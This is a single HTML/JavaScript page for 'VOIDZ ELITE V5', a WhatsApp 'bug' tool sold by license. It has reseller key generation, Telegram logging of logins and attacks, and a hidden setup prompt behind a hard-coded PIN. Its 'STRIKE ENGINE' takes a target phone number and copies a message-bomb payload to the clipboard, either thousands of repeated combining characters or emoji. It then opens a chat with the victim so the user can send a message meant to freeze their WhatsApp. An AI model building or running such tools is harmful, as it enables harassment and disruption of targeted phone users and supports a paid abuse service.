<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>VOIDZ ELITE V5 - ULTIMATE SUPREME</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --fire: #ff4500; --neon-red: #ff0000; --bg: #000; --card: rgba(10, 0, 0, 0.98); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; -webkit-tap-highlight-color: transparent; }
        body { background: var(--bg); color: #fff; height: 100vh; width: 100vw; overflow: hidden; position: relative; }
        
        /* Layer 1: Background Partikel (Tembus Klik) */
        #ash-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }

        /* Layer 2: Main UI */
        .content-layer { position: relative; z-index: 10; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        .neon-red { color: var(--neon-red); text-shadow: 0 0 10px var(--neon-red), 0 0 20px var(--neon-red); font-family: 'Orbitron'; font-weight: 900; }
        
        /* LOGIN PAGE */
        #loginPage { flex: 1; display: flex; justify-content: center; align-items: center; z-index: 100; }
        .login-box { 
            width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; 
            padding: 30px; border-radius: 15px; text-align: center; border-top: 3px solid var(--fire);
            box-shadow: 0 10px 50px rgba(0,0,0,1);
        }
        
        .profile-img { width: 85px; height: 85px; border-radius: 50%; border: 2px solid var(--fire); box-shadow: 0 0 15px var(--fire); margin-bottom: 20px; object-fit: cover; }

        /* TOMBOL UTAMA (ANTI MACET) */
        .btn-main { 
            width: 100%; background: var(--fire); color: #000; border: none; padding: 14px; 
            font-weight: 900; cursor: pointer; border-radius: 5px; font-family: 'Orbitron'; 
            margin-top: 10px; transition: 0.2s; position: relative; z-index: 200; pointer-events: auto; display: block;
        }
        .btn-main:active { transform: scale(0.95); opacity: 0.8; }
        
        .input-box { width: 100%; background: #080808; border: 1px solid #333; padding: 12px; color: #fff; margin-bottom: 10px; text-align: center; font-size: 11px; border-radius: 5px; outline: none; }

        /* DASHBOARD */
        .tab-content { display: none; padding: 15px; overflow-y: auto; height: 100%; padding-bottom: 100px; }
        .active-tab { display: block; }
        
        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #050505; border-top: 1px solid #222; display: none; height: 65px; z-index: 1000; }
        .nav-btn { display: flex; flex-direction: column; align-items: center; justify-content: center; color: #444; flex: 1; font-size: 8px; cursor: pointer; }
        .nav-btn.active { color: var(--fire); }

        .banner-container { grid-column: span 2; position: relative; width: 100%; height: 150px; border-radius: 12px; overflow: hidden; border: 1px solid var(--fire); margin-bottom: 5px; background:#000; }
        .banner-video { width: 100%; height: 100%; object-fit: cover; opacity: 0.7; }
        marquee { background: rgba(255, 69, 0, 0.1); color: var(--fire); font-size: 9px; padding: 4px; border-radius: 4px; margin-bottom: 5px; display: block; }
        .activity-log { font-size: 8px; background: #080808; padding: 8px; border-radius: 5px; border: 1px solid #111; margin-top: 5px; height: 80px; overflow-y: hidden; }
    </style>
</head>
<body>
    <canvas id="ash-canvas"></canvas>

    <div class="content-layer">
        <div id="loginPage">
            <div class="login-box">
                <img src="login.jpg" class="profile-img" onerror="this.src='https://api.dicebear.com/7.x/pixel-art/svg?seed=voidz'">
                <h2 class="neon-red" onclick="handleSecretClick()" style="font-size:16px; margin-bottom:20px;">VOIDZ ELITE V5</h2>
                <input type="text" id="lUser" class="input-box" placeholder="OPERATOR ID">
                <input type="password" id="lPass" class="input-box" placeholder="ACCESS KEY">
                <button onclick="auth()" class="btn-main" id="btnLog">IGNITE</button>
                <div style="margin-top: 15px; font-size: 9px; display: flex; flex-direction: column; gap: 8px;">
                    <a href="javascript:void(0)" onclick="window.open(VOIDZ_CONFIG.linkSaluran)" style="color: #25d366; text-decoration: none;"><i class="fab fa-whatsapp"></i> JOIN CHANNEL</a>
                    <a href="javascript:void(0)" onclick="window.open('https://wa.me/'+VOIDZ_CONFIG.adminWA)" style="color: #00e5ff; text-decoration: none;"><i class="fas fa-key"></i> BUY LICENSE</a>
                </div>
            </div>
        </div>

        <div id="mainApp" style="display:none; flex:1; overflow:hidden;">
            <div id="tabHOME" class="tab-content active-tab">
                <h2 class="neon-red" style="text-align:center; margin-top:20px; font-size: 18px;">COMMAND CENTER</h2>
                <div id="menuContainer" style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:15px;"></div>
                <button class="btn-main" style="background:#111; color:#555; margin-top:20px;" onclick="location.reload()">LOGOUT</button>
            </div>
            
            <div id="tabATTACK" class="tab-content">
                <h2 class="neon-red" style="text-align:center; margin-top:20px;">STRIKE ENGINE</h2>
                <div style="margin-top:20px; background:#050505; padding:20px; border-radius:10px; border:1px solid #222; border-top:2px solid var(--fire);">
                    <input type="text" id="targetBug" class="input-box" placeholder="Target 628xxx">
                    <select id="bugLevel" class="input-box">
                        <option value="LITE">LEVEL: LITE</option>
                        <option value="FREEZE">LEVEL: FREEZE</option>
                        <option value="SUPREME">LEVEL: SUPREME</option>
                        <option value="ULTIMATE">LEVEL: ULTIMATE</option>
                    </select>
                    <button id="strikeBtn" class="btn-main" onclick="startAttack()">EXECUTE STRIKE</button>
                </div>
            </div>
        </div>

        <nav id="bottomNav" class="bottom-nav">
            <div class="nav-btn active" onclick="switchTab('home', this)"><i class="fas fa-home"></i><span>HOME</span></div>
            <div class="nav-btn" onclick="switchTab('attack', this)"><i class="fas fa-skull"></i><span>ATTACK</span></div>
        </nav>
    </div>

    <script>
        // CONFIG
        const VOIDZ_CONFIG = {
            adminWA: "6285718241306",
            linkSaluran: "https://whatsapp.com/channel/0029VbC50wZInlqIFSnZVt0U",
            systemName: "VOIDZ ELITE V5",
            marqueeText: " [ STABLE V5 ] â€” [ OWNER & RESELLER SYSTEM ACTIVE ] â€” [ AUTO LOGS TELEGRAM ] ",
            botToken: "TOKEN_BOT_LU", // Isi Token Bot Telegram
            chatId: "ID_CHAT_LU"      // Isi ID Chat Telegram
        };

        // ENGINE DASHBOARD
        let JB_KEY = localStorage.getItem('JB_KEY'), JB_BIN = localStorage.getItem('JB_BIN'), DB = {}, CURRENT_ID = "";

        async function auth() {
            if(!JB_KEY || !JB_BIN) return alert("Klik judul 3x untuk setup!");
            const u = document.getElementById('lUser').value.trim().toLowerCase(), p = document.getElementById('lPass').value.trim();
            const btn = document.getElementById('btnLog'); btn.innerText = "VERIFYING...";
            try {
                const res = await fetch(`https://api.jsonbin.io/v3/b/${JB_BIN}/latest`, { headers: {'X-Master-Key': JB_KEY, 'X-Bin-Meta': false} });
                DB = await res.json();
                if(DB[u] && DB[u].pw === p) {
                    if(DB[u].expired !== "LIFETIME" && new Date().getTime() > new Date(DB[u].expired).getTime()) return alert("EXPIRED!");
                    CURRENT_ID = u;
                    sendTele(`ðŸ”” <b>LOGIN</b>\nðŸ‘¤ User: ${u}\nðŸŽ­ Role: ${DB[u].role}`);
                    document.getElementById('loginPage').style.display = 'none';
                    document.getElementById('mainApp').style.display = 'block';
                    document.getElementById('bottomNav').style.display = 'flex';
                    renderHome(u, DB[u]);
                } else { alert("WRONG ACCESS!"); btn.innerText = "IGNITE"; }
            } catch(e) { alert("DB ERROR!"); btn.innerText = "IGNITE"; }
        }

        function renderHome(id, data) {
            const isOwner = data.role.toLowerCase() === 'owner';
            const isReseller = data.role.toLowerCase() === 'reseller';
            const stats = DB.stats || { total: 0, logs: [] };

            document.getElementById('menuContainer').innerHTML = `
                <div class="banner-container">
                    <video autoplay loop muted playsinline class="banner-video"><source src="dashboard.mp4" type="video/mp4"></video>
                    <div style="position: absolute; inset: 0; background: linear-gradient(transparent, rgba(0,0,0,0.9));"></div>
                    <div style="position: absolute; bottom: 10px; left: 15px;">
                        <div style="font-family:'Orbitron'; font-size:13px; color:#fff;">${VOIDZ_CONFIG.systemName}</div>
                        <div style="font-size:8px; color:var(--fire);">OPERATOR: ${id.toUpperCase()}</div>
                    </div>
                </div>
                <marquee style="grid-column: span 2;">${VOIDZ_CONFIG.marqueeText}</marquee>

                <div style="grid-column: span 2; display:flex; gap:5px;">
                    <div style="flex:1; background:#080808; border:1px solid #222; padding:10px; border-radius:8px; text-align:center;">
                        <div style="font-size:7px; color:#555;">GLOBAL STRIKE</div>
                        <div style="font-size:12px; color:var(--fire); font-weight:900;">${stats.total}</div>
                    </div>
                    <div style="flex:1; background:#080808; border:1px solid #222; padding:10px; border-radius:8px; text-align:center;">
                        <div style="font-size:7px; color:#555;">DURASI</div>
                        <div style="font-size:10px; color:#0f0;">${data.expired === "LIFETIME" ? "PERMANENT" : "30 DAYS"}</div>
                    </div>
                </div>

                <div class="activity-log" style="grid-column: span 2;">
                    <div style="color:var(--fire); font-weight:bold; margin-bottom:5px;">RECENT ACTIVITIES</div>
                    ${stats.logs.map(l => `<div style="margin-bottom:2px;">> ${l.u} striked ${l.t.slice(0,6)}... [${l.l}]</div>`).join('')}
                </div>

                ${(isOwner || isReseller) ? `
                <div style="grid-column: span 2; background:rgba(20,0,0,0.9); border:1px solid var(--fire); padding:15px; border-radius:10px; margin-top:5px;">
                    <div style="font-size:10px; color:var(--fire); font-weight:bold; margin-bottom:10px;">GENERATOR</div>
                    <input type="text" id="newID" class="input-box" placeholder="Operator ID">
                    <input type="text" id="newPW" class="input-box" placeholder="Password">
                    ${isOwner ? `<select id="newRole" class="input-box" onchange="toggleQuota()"><option value="member">MEMBER</option><option value="reseller">RESELLER</option></select>` : `<input type="hidden" id="newRole" value="member">`}
                    <select id="newTime" class="input-box">
                        <option value="30">1 MONTH</option>
                        ${(isOwner || data.expired === "LIFETIME") ? `<option value="LIFETIME">LIFETIME</option>` : ''}
                    </select>
                    <div id="qArea" style="display:${isReseller ? 'block' : 'none'};"><input type="number" id="newQuota" class="input-box" placeholder="Quota"></div>
                    <button onclick="genKey()" class="btn-main">CREATE KEY</button>
                    ${isOwner ? `<input type="text" id="tDel" class="input-box" placeholder="ID to Delete" style="margin-top:10px; border-color:#400;"><button onclick="delUser()" class="btn-main" style="background:#f00;">BAN USER</button>` : ''}
                </div>` : ''}
            `;
        }

        async function startAttack() {
            const t = document.getElementById('targetBug').value.trim(), l = document.getElementById('bugLevel').value;
            if(!t) return alert("Input Target!");
            
            if(!DB.stats) DB.stats = { total: 0, logs: [] };
            DB.stats.total += 1;
            DB.stats.logs.unshift({ u: CURRENT_ID, t: t, l: l });
            if(DB.stats.logs.length > 5) DB.stats.logs.pop();

            await fetch(`https://api.jsonbin.io/v3/b/${JB_BIN}`, { method: 'PUT', headers: {'Content-Type': 'application/json', 'X-Master-Key': JB_KEY}, body: JSON.stringify(DB) });
            sendTele(`ðŸš€ <b>STRIKE</b>\nðŸ‘¤ By: ${CURRENT_ID}\nðŸŽ¯ Target: ${t}\nðŸ”¥ Level: ${l}`);
            
            let p = (l === "ULTIMATE") ? "Ò‰".repeat(5000) : "ðŸ”¥".repeat(1000);
            navigator.clipboard.writeText(p).then(() => { alert("COPIED!"); window.open(`https://wa.me/${t.replace(/\D/g, '')}`, '_blank'); });
        }

        async function genKey() {
            const ni = document.getElementById('newID').value.trim().toLowerCase(), np = document.getElementById('newPW').value.trim(), nr = document.getElementById('newRole').value, nt = document.getElementById('newTime').value, nq = document.getElementById('newQuota').value || "100";
            let ex = "LIFETIME"; if(nt !== "LIFETIME") { let d = new Date(); d.setDate(d.getDate() + 30); ex = d.toISOString(); }
            DB[ni] = { pw: np, role: nr, quota: nq, expired: ex };
            await fetch(`https://api.jsonbin.io/v3/b/${JB_BIN}`, { method: 'PUT', headers: {'Content-Type': 'application/json', 'X-Master-Key': JB_KEY}, body: JSON.stringify(DB) });
            alert("KEY CREATED!"); location.reload();
        }

        async function delUser() {
            const td = document.getElementById('tDel').value.trim();
            if(DB[td] && DB[td].role !== 'owner') { delete DB[td]; await fetch(`https://api.jsonbin.io/v3/b/${JB_BIN}`, { method: 'PUT', headers: {'Content-Type': 'application/json', 'X-Master-Key': JB_KEY}, body: JSON.stringify(DB) }); alert("DELETED!"); location.reload(); }
        }

        function toggleQuota() { document.getElementById('qArea').style.display = (document.getElementById('newRole').value !== 'owner' ? 'block' : 'none'); }
        async function sendTele(m) { fetch(`https://api.telegram.org/bot${VOIDZ_CONFIG.botToken}/sendMessage?chat_id=${VOIDZ_CONFIG.chatId}&text=${encodeURIComponent(m)}&parse_mode=html`); }
        function switchTab(t, e) { document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active-tab')); document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab'); document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active')); e.classList.add('active'); }
        function handleSecretClick() { let n = Date.now(); if(n - last > 1000) clicks = 0; clicks++; last = n; if(clicks === 3) setupAPI(); }
        function setupAPI() { if(prompt("PIN:")==="2404"){let k=prompt("Key:"),b=prompt("Bin:");if(k&&b){localStorage.setItem('JB_KEY',k);localStorage.setItem('JB_BIN',b);location.reload();}}}
        
        const canvas = document.getElementById('ash-canvas'); const ctx = canvas.getContext('2d'); let particles = [];
        function initCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; particles = []; for(let i=0; i<50; i++) particles.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, s: Math.random()*2, d: Math.random()*0.5 }); }
        function animate() { ctx.clearRect(0,0,canvas.width,canvas.height); ctx.fillStyle = "rgba(255,255,255,0.2)"; particles.forEach(p => { ctx.beginPath(); ctx.arc(p.x, p.y, p.s, 0, Math.PI*2); ctx.fill(); p.y -= p.d; if(p.y < 0) p.y = canvas.height; }); requestAnimationFrame(animate); }
        let clicks = 0, last = 0; window.addEventListener('resize', initCanvas); initCanvas(); animate();
    </script>
</body>
</html>
